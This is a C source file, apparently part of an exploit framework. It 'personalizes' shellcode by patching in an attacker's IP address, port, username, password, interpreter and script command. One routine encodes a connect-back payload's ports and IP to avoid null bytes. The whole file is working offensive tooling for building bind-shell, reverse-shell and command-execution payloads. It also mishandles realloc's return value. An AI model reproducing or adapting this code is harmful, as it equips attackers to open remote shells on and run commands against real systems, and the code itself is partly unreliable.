/*
 * Shellcode personalization
 */

// print error message, if a mark is not found
void mark_not_found(const char *type)
{
    printf("[!] ERROR: %s mark not found. Check your payload\n", type);
    exit(-1);
}

// ip = 32bits unsigned integer
void set_ip(char *shellcode, u_int32_t ip)
{
    char *ptr = NULL;

    if(!(ptr = index(shellcode, ip_mark))) mark_not_found("IP");

    *(u_int32_t*)ptr = ip;
}

// port = 16bits unsigned integer
void set_port(char *shellcode, u_int16_t port)
{
    char *ptr = NULL;

    if(!(ptr = memchr(shellcode, port_mark, payload_len))) mark_not_found("port");

    *(u_int16_t*)ptr = port;
}

// username = 3 chars
void set_username(char *shellcode, char *username)
{
    char name[3];
    char *ptr = NULL;
    int name_len = strlen(username);


    memset(name, 'a', 3);

    if(!(ptr = index(shellcode, username_mark))) mark_not_found("username");

    strncpy(name, username, (name_len < 3) ? name_len : 3);
    strncpy(ptr, name, 3);
}

// password = 8 chars
void set_password(char *shellcode, char *password)
{
    char pass[8];
    char *ptr1 = NULL, *ptr2 = NULL;
    int pass_len = strlen(password);

    memset(pass, 'a', 8);

    ptr1 = index(shellcode, password_mark);
    ptr2 = index(ptr1+4, password_mark);
    if(!ptr1 || !ptr2) mark_not_found("password");

    strncpy(pass, password, (pass_len < 8) ? pass_len : 8);

    strncpy(ptr1, pass + 4, 4);
    strncpy(ptr2, pass, 4);

}

// interpreter (/bin/bash, /usr/bin/perl, etc...)
void set_interpreter(char *shellcode, char *_interpreter)
{
    char *ptr = NULL;
    char *interpreter = _interpreter;
    int interp_len, bytes_to_move;

    if(!interpreter) interpreter = "/bin/bash";
    interp_len = strlen(interpreter);

    if(!(ptr = index(shellcode, interp_mark))) mark_not_found("interpreter");

    payload_len += (interp_len - 1);
    if(!realloc(shellcode, payload_len)) exit(-1);

    bytes_to_move = payload_len - (ptr - sh_buffer) - interp_len;
    strncpy(ptr+interp_len, ptr+1, bytes_to_move);
    strncpy(ptr, interpreter, interp_len);
}

// script code
void set_script(char *shellcode, char *_cmd)
{
    char *ptr = NULL;
    char *cmd = _cmd;
    int cmd_len = 0;

    if(!cmd) cmd = "echo test";
    if(!(ptr = index(shellcode, script_mark))) mark_not_found("script");

    cmd_len = strlen(cmd);

    payload_len += cmd_len;
    if(!realloc(shellcode, payload_len+1)) exit(-1);

    strncpy(ptr, cmd, cmd_len);
    *(ptr + cmd_len) = '\0';
}

// Russell Sanford - xort@tty64.org
int find_safe_offset(int INT_A) {

    int INT_B=0;
    do {
        INT_A -= 0x01010101;    INT_B += 0x01010101;
    }
    while ( ((INT_A & 0x000000ff) == 0) ||
            ((INT_A & 0x0000ff00) == 0) ||
            ((INT_A & 0x00ff0000) == 0) ||
            ((INT_A & 0xff000000) == 0) );

    return INT_B;
}

// Russell Sanford - xort@tty64.org
void patchcode(char *shellcode, uint16_t PORT_IN, uint32_t IP, uint16_t PORT_OUT) {

    uint16_t PORT_IN_A = PORT_IN;
    uint16_t PORT_IN_B = find_safe_offset(PORT_IN_A);

    int IP_A = IP;
    int IP_B = find_safe_offset(IP_A);

    int PORT_OUT_A = PORT_OUT;
    int PORT_OUT_B = find_safe_offset(PORT_OUT_A);

    *(int *)&shellcode[134] = (PORT_IN_A - PORT_IN_B);
    *(int *)&shellcode[141] = PORT_IN_B;

    *(int *)&shellcode[205] = (IP_A - IP_B);
    *(int *)&shellcode[212] = IP_B;

    *(int *)&shellcode[217] = (PORT_OUT_A - PORT_OUT_B);
    *(int *)&shellcode[224] = PORT_OUT_B;

}

// main function
void personalize_shellcode(void)
{
    //printf("[DBG] Payload before personalization:\n%s\n", sh_buffer);
    if(args.payload_index == 4) {
        patchcode(sh_buffer, args.my_port, args.my_ip, args.my_port2);
    }
    else if(args.payload_index == 5) {
     set_interpreter(sh_buffer, args.interpreter);
     set_script(sh_buffer, args.script_code);
    }
    else {
        if(args.my_ip) set_ip(sh_buffer, args.my_ip);
        if(args.my_port) set_port(sh_buffer, args.my_port);
        if(args.my_username) set_username(sh_buffer, args.my_username);
        if(args.my_password) set_password(sh_buffer, args.my_password);
    }
    //printf("[DBG] Payload after personalization:\n%s\n", sh_buffer);
}
